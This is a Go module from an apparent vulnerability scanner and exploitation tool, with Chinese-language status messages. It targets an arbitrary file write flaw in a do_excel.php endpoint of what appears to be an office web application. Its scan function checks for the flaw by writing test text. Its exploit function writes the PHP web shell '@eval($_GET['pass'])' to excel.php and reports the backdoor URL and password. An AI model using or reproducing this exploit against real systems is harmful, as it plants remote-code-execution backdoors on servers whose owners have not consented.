package vulners

import (
	"github.com/fatih/color"
	"strings"
)

type Wo02 struct {
}

func (s *Wo02) Scan(targetUrl string) {
	vulnerable, err := Wo02scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Wo02] 存在do_excel 任意文件写入")
	} else {
		color.White("[Wo02] 不存在do_excel 任意文件写入")
	}
}

func (*Wo02) Exploit(targetUrl string) {
	runResult, err := Wo02runcore(targetUrl)
	if err != nil {
		color.Red("[x]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Wo02scancore(targetUrl string) (bool, error) {
	url := "/general/charge/charge_list/do_excel.php"
	webshell := "/general/charge/charge_list/excel.php"
	data := "html=test"
	_, err := baseClient.NewRequest().
		SetBodyString(data).
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Post(targetUrl + url)
	if err != nil {
		return false, err
	}
	resp, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + webshell)
	if err != nil {
		return false, err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "test") {
		return true, nil
	} else {
		return false, nil
	}
}

func Wo02runcore(targetUrl string) (string, error) {
	url := "/general/charge/charge_list/do_excel.php"
	webshell := "/general/charge/charge_list/excel.php"
	data := "html=<?php @eval($_GET['pass']);?>"
	_, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		SetBodyString(data).
		Post(targetUrl + url)
	if err != nil {
		return "", err
	}
	resp, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + webshell)
	if err != nil {
		return "", err
	}
	resContent := resp.String()

	if strings.Contains(resContent, "excel") {
		return "do_excel 任意文件写入,密码pass webshell地址:\n" + targetUrl + webshell, nil
	} else {
		return "", nil
	}
}
